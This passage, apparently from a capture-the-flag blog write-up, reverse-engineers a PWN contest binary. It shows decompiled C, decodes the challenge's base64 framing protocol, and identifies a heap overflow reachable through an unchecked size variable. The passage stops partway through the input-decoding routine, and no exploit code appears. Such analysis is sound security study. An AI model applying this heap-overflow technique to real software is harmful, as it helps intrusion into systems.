<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>The Writeup Of Hong Ming Gu Cup Online | Hexo</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/demo/"><span class="navItemTitle">独立页面</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>The Writeup Of Hong Ming Gu Cup Online</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-04-02T12:01:00.000Z" id="date"> 2021-04-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-04-30T14:02:20.050Z" id="updated"> 2022-04-30</time></div></span><br><span>Word Count: <div class="control">3k</div></span><br><span>Read Time: <div class="control">18 min</div></span></div></div><hr><div id="post-content"><h1 id="Hong-Ming-Gu-Cup-Online"><a href="#Hong-Ming-Gu-Cup-Online" class="headerlink" title="Hong Ming Gu Cup Online"></a>Hong Ming Gu Cup Online</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">战队名称：没有任何<br>战队排名：41<br>战队ID：T566675<br>解题数量：5<br>得分：634<br></code></pre></td></tr></table></figure>



<h2 id="PWN-Maybe-fun-game-双边协议1-0"><a href="#PWN-Maybe-fun-game-双边协议1-0" class="headerlink" title="PWN - [Maybe_fun_game (双边协议1.0)]"></a>PWN - [Maybe_fun_game (双边协议1.0)]</h2><h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>This challenge I think is a little bit difficult for me. because these vulnerability cannot exploit easily.</p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Checksec file: pwn<br>[*] &#x27;/run/media/i0gan/disk1/share/hmgb/pwn1/pwn&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    FORTIFY:  Enabled<br></code></pre></td></tr></table></figure>

<p>Attachment:</p>
<p>Maybe_fun_game.zip </p>
<p>Just a single binary file, not include libc.so.6 file. So we have to leak information of libc version by some ways.</p>
<h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[i0gan@arch pwn1]$ ./pwn <br>eFY0EnhWNBIuAAAAAAAAAAgAAAAAAAAABgAAAAAAAABBQUFBQUFBQTEuTmV3Lg==<br>eFY0EnhWNBIuAAAAAAAAAAgAAAAAAAAABgAAAAAAAABBQUFBQUFBQTIuRGVsLg==<br>eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQTMuRWRpdC4=<br>eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQTQuU2hvdy4=<br>eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob2ljZSA/Pg==<br>AAA<br>eFY0EnhWNBI2AAAAAAAAAAgAAAAAAAAADgAAAAAAAABBQUFBQUFBQUlsbGVnYWwgTWFnaWMh<br></code></pre></td></tr></table></figure>

<p>We don’t know how these words means, But easily guess that it is base64 encoded. Now we should analyse this binary file by IDA tools.</p>
<h4 id="munu-function"><a href="#munu-function" class="headerlink" title="munu function"></a>munu function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  enc_print(<span class="hljs-string">&quot;1.New.&quot;</span>);<br>  enc_print(<span class="hljs-string">&quot;2.Del.&quot;</span>);<br>  enc_print(<span class="hljs-string">&quot;3.Edit.&quot;</span>);<br>  enc_print(<span class="hljs-string">&quot;4.Show.&quot;</span>);<br>  <span class="hljs-keyword">return</span> enc_print(<span class="hljs-string">&quot;Choice &gt;&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Call enc_print function encoding string to print it.</p>
<h4 id="main-function"><a href="#main-function" class="headerlink" title="main function"></a>main function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *body; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> c; <span class="hljs-comment">// cl</span><br>  __int64 v8; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *body_; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> c_; <span class="hljs-comment">// cl</span><br>  __int64 v11; <span class="hljs-comment">// rdx</span><br><br>  init_();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )                                 <span class="hljs-comment">// delete</span><br>    &#123;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        menu();<br>        v3 = dec_input();<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(v3, <span class="hljs-string">&quot;ERROR&quot;</span>) )<br>        &#123;<br>          <span class="hljs-built_in">free</span>(global_ptr);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        v4 = *v3;<br>        <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-string">&#x27;2&#x27;</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">free</span>(src);<br>        src = <span class="hljs-number">0LL</span>;<br>        size = <span class="hljs-number">0</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-string">&#x27;2&#x27;</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-string">&#x27;1&#x27;</span> )                          <span class="hljs-comment">// new</span><br>      &#123;<br>        enc_print(<span class="hljs-string">&quot;Size &gt;&gt;&quot;</span>);<br>        v5 = dec_input();<br>        size = strtol(v5, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>);<br>        <span class="hljs-built_in">free</span>(global_ptr);<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(size - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">0x7E</span> )<br>        &#123;<br>          src = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>          enc_print(<span class="hljs-string">&quot;Content &gt;&gt;&quot;</span>);<br>          body_ = dec_input();<br>          <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>          &#123;<br>            c_ = *body_;<br>            <span class="hljs-keyword">if</span> ( *body_ )<br>            &#123;<br>              v11 = <span class="hljs-number">1LL</span>;<br>              <span class="hljs-keyword">do</span><br>              &#123;<br>                src[v11 - <span class="hljs-number">1</span>] = c_;<br>                <span class="hljs-keyword">if</span> ( size &lt;= (<span class="hljs-type">int</span>)v11 )<br>                  <span class="hljs-keyword">break</span>;<br>                c_ = body_[v11++];<br>              &#125;<br>              <span class="hljs-keyword">while</span> ( c_ );<br>            &#125;<br>          &#125;<br>LABEL_18:<br>          <span class="hljs-built_in">free</span>(global_ptr);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          enc_print(<span class="hljs-string">&quot;Illegal size!&quot;</span>);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_12:<br>        enc_print(<span class="hljs-string">&quot;Your Choice is invaild.&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-string">&#x27;3&#x27;</span> )                            <span class="hljs-comment">// edit</span><br>    &#123;<br>      enc_print(<span class="hljs-string">&quot;Content &gt;&gt;&quot;</span>);<br>      body = dec_input();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>      &#123;<br>        c = *body;<br>        <span class="hljs-keyword">if</span> ( *body != <span class="hljs-string">&#x27;\n&#x27;</span> )<br>        &#123;<br>          v8 = <span class="hljs-number">1LL</span>;<br>          <span class="hljs-keyword">do</span><br>          &#123;<br>            src[v8 - <span class="hljs-number">1</span>] = c;<br>            <span class="hljs-keyword">if</span> ( size &lt;= (<span class="hljs-type">int</span>)v8 )<br>              <span class="hljs-keyword">break</span>;<br>            c = body[v8++];<br>          &#125;<br>          <span class="hljs-keyword">while</span> ( c != <span class="hljs-string">&#x27;\n&#x27;</span> );<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_18;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-string">&#x27;4&#x27;</span> )                            <span class="hljs-comment">// print</span><br>      <span class="hljs-keyword">goto</span> LABEL_12;<br>    enc_print(src);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>All logical function are here.</p>
<p>These program have 4 functions</p>
<p>1.New: new data, needs size, and content<br>2.Del: delete data<br>3.Edit. edit data, just needs content<br>4.Show. show data content</p>
<p>We execute New function, that just use a <code>src</code> veriable to store returned pointer. that means we just can control a chunk every time.</p>
<p>When execute New function, input size more than 0x7F, So this program haven’t malloc memory, but set the size veriable as new one.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">enc_print(<span class="hljs-string">&quot;Size &gt;&gt;&quot;</span>);<br>        v5 = dec_input();<br>        size = strtol(v5, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>);<br>        <span class="hljs-built_in">free</span>(global_ptr);<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(size - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">0x7E</span> )<br></code></pre></td></tr></table></figure>

<p>That can cause modify the size variable. If we new a normal data, then we input a size more than &gt; 0x7F, when we execute Edit function, we can input more data to chunk. So that cause a heap overflow here.</p>
<h4 id="enc-print-function"><a href="#enc-print-function" class="headerlink" title="enc_print function"></a>enc_print function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">printw</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span><br>&#123;<br>  __int64 size_; <span class="hljs-comment">// rbx</span><br>  _QWORD *v2; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// r13</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int64 vars0[<span class="hljs-number">512</span>]; <span class="hljs-comment">// [rsp+0h] [rbp+0h] BYREF</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">4104</span>]; <span class="hljs-comment">// [rsp+1000h] [rbp+1000h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 vars2008; <span class="hljs-comment">// [rsp+2008h] [rbp+2008h]</span><br><br>  qword_203110 = <span class="hljs-number">8LL</span>;<br>  vars2008 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(vars0, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(vars0));<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>uLL);<br>  qword_203100 = <span class="hljs-number">0x1234567812345678</span>LL; <span class="hljs-comment">// magic</span><br>  size_ = <span class="hljs-built_in">strlen</span>(src); <span class="hljs-comment">// Get length of string</span><br>  real_size = size_; <span class="hljs-comment">// size</span><br>  v2 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">8uLL</span>, <span class="hljs-number">1uLL</span>);<br>  qword_203120 = (__int64)v2;<br>  *v2 = <span class="hljs-number">0x4141414141414141</span>LL; <span class="hljs-comment">// end flag</span><br>  v3 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">calloc</span>(size_, <span class="hljs-number">1uLL</span>);<br>  v4 = size_;<br>  v5 = v3;<br>  qword_203128 = (__int64)v3;<br>  size_ += <span class="hljs-number">0x28</span>LL;<br>  <span class="hljs-built_in">strncpy</span>(v3, src, v4);<br>  qword_203108 = size_;<br>  vars0[<span class="hljs-number">1</span>] = size_;<br>  vars0[<span class="hljs-number">0</span>] = qword_203100;<br>  vars0[<span class="hljs-number">2</span>] = qword_203110;<br>  vars0[<span class="hljs-number">3</span>] = real_size;<br>  v6 = _stpcpy_chk((<span class="hljs-type">char</span> *)&amp;vars0[<span class="hljs-number">4</span>] + <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;vars0[<span class="hljs-number">4</span>]), v2, <span class="hljs-number">4064LL</span>); <span class="hljs-comment">// copy end flag</span><br>  _strcpy_chk(v6, (__int64)v5, <span class="hljs-number">4064LL</span>);<br>  base64_enc((<span class="hljs-type">unsigned</span> __int8 *)vars0, size_, (__int64)s);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ vars2008;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>We should reverse this protocol by read pseudo code.</p>
<p><code>src</code> is a source string will be encoded.</p>
<p><code>qword_203100 = 0x1234567812345678</code> is protocol’s magic.</p>
<p><code>v2</code> store end flag of protocol </p>
<p>vars0 is an array to store information of this protocol</p>
<p>vars0[0]: protocol’s magic (0x1234567812345678)</p>
<p>vars0[1]: strlen(source string) + 0x28</p>
<p>vars0[2]: store <code>qword_203100</code>, value is 8, this value we can change.</p>
<p>vars0[3]: strlen(source string)</p>
<p>vars0[4]: header’s end flag of protocol, (0x4141414141414141)</p>
<p>Then source string will copy to end after vars0[4] and encoded with base64.</p>
<p>Now we can write decode function to decode what this program print.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">d</span>):<br>    p = base64.b64decode(d)<br>    <span class="hljs-keyword">return</span> p[<span class="hljs-number">0x28</span>:]<br></code></pre></td></tr></table></figure>

<p>It’s too easy, just use base64 decode what this program print, then cuts header data off, let body data return.</p>
<p>Writting encode function to encode what we want input. but we have to analyse dec_input function.</p>
<p>dec_input function pseudo code as follows.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">sub_1070</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 i; <span class="hljs-comment">// rax</span><br>  __int64 j; <span class="hljs-comment">// rbp</span><br>  <span class="hljs-type">double</span> v2; <span class="hljs-comment">// xmm2_8</span><br>  <span class="hljs-type">double</span> v3; <span class="hljs-comment">// xmm1_8</span><br>  __int64 k; <span class="hljs-comment">// rbp</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">double</span> v6; <span class="hljs-comment">// xmm1_8</span><br>  <span class="hljs-type">size_t</span> size_; <span class="hljs-comment">// rdi</span><br>  __int64 v8; <span class="hljs-comment">// r12</span><br>  <span class="hljs-type">void</span> *v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">double</span> v11; <span class="hljs-comment">// xmm1_8</span><br>  <span class="hljs-type">double</span> v12; <span class="hljs-comment">// xmm0_8</span><br>  __int64 v13; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v14; <span class="hljs-comment">// rsi</span><br>  __int64 l; <span class="hljs-comment">// rax</span><br>  __int64 v16; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v18; <span class="hljs-comment">// rdi</span><br>  __int64 v19[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-5058h]</span><br>  __int64 v20[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-5048h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-5038h] BYREF</span><br>  <span class="hljs-type">char</span> str[<span class="hljs-number">8192</span>]; <span class="hljs-comment">// [rsp+1030h] [rbp-4038h] BYREF</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+3030h] [rbp-2038h] BYREF</span><br>  <span class="hljs-type">char</span> v24[<span class="hljs-number">8160</span>]; <span class="hljs-comment">// [rsp+3050h] [rbp-2018h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v25; <span class="hljs-comment">// [rsp+5038h] [rbp-30h]</span><br>  <span class="hljs-type">char</span> v26[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+5040h] [rbp-28h] BYREF</span><br><br>  v25 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x1000</span>uLL);<br>  <span class="hljs-built_in">memset</span>(str, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(str));<br>  base64_dec((<span class="hljs-type">unsigned</span> __int8 *)buf, <span class="hljs-built_in">strlen</span>(buf), (__int64)str);<br>  v19[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1234567812345678</span>LL;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i != <span class="hljs-number">8</span>; ++i )                  <span class="hljs-comment">// check magic</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *((_BYTE *)v19 + i) != str[i] )<br>    &#123;<br>      v18 = <span class="hljs-string">&quot;Illegal Magic!&quot;</span>;<br>      <span class="hljs-keyword">goto</span> ERROR;                               <span class="hljs-comment">// check_magic... goto error</span><br>    &#125;<br>  &#125;<br>  qword_2030C8 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0LL</span>; j != <span class="hljs-number">8</span>; ++j )                  <span class="hljs-comment">// calc vars[1]: strlen(source string) + 0x28</span><br>  &#123;<br>    v2 = (<span class="hljs-type">double</span>)str[j + <span class="hljs-number">8</span>];<br>    v3 = (<span class="hljs-type">double</span>)(<span class="hljs-type">int</span>)j;<br>    qword_2030C8 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">int</span>)(<span class="hljs-built_in">pow</span>(<span class="hljs-number">256.0</span>, v3) * v2 + (<span class="hljs-type">double</span>)(<span class="hljs-type">int</span>)qword_2030C8);<br>  &#125;<br>  sz = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0LL</span>; k != <span class="hljs-number">8</span>; ++k )                  <span class="hljs-comment">// vars[2]: defualt value is 8, this value we can control malloc size</span><br>  &#123;<br>    v5 = str[k + <span class="hljs-number">16</span>];<br>    v6 = (<span class="hljs-type">double</span>)(<span class="hljs-type">int</span>)k;<br>    size_ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">int</span>)(<span class="hljs-built_in">pow</span>(<span class="hljs-number">256.0</span>, v6) * (<span class="hljs-type">double</span>)v5 + (<span class="hljs-type">double</span>)(<span class="hljs-type">int</span>)sz);<br>    sz = size_;<br>  &#125;<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v9 = <span class="hljs-built_in">malloc</span>(size_);<br>  qword_2030D8 = <span class="hljs-number">0LL</span>;<br>  data_buf = v9;<br>  <span class="hljs-keyword">do</span><br>  &#123;                                             <span class="hljs-comment">// vars[3]: strlen(source string)</span><br>    v10 = str[v8 + <span class="hljs-number">0x18</span>];<br>    v11 = (<span class="hljs-type">double</span>)(<span class="hljs-type">int</span>)v8++;<br>    v12 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">256.0</span>, v11) * (<span class="hljs-type">double</span>)v10 + (<span class="hljs-type">double</span>)(<span class="hljs-type">int</span>)qword_2030D8;<br>    qword_2030D8 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">int</span>)v12;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v8 != <span class="hljs-number">8</span> );<br>  global_ptr = <span class="hljs-built_in">calloc</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">int</span>)v12, <span class="hljs-number">1uLL</span>);<br>  <span class="hljs-keyword">if</span> ( qword_2030C8 != (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">int</span>)v12 + sz + <span class="hljs-number">0x20</span> )<span class="hljs-comment">// check_size</span><br>  &#123;<br>    v18 = <span class="hljs-string">&quot;Illegal Head!&quot;</span>;<br>ERROR:<br>    enc_print(v18);<br>    <span class="hljs-built_in">free</span>(global_ptr);<br>    <span class="hljs-built_in">free</span>(data_buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span>;<br>  &#125;<br> 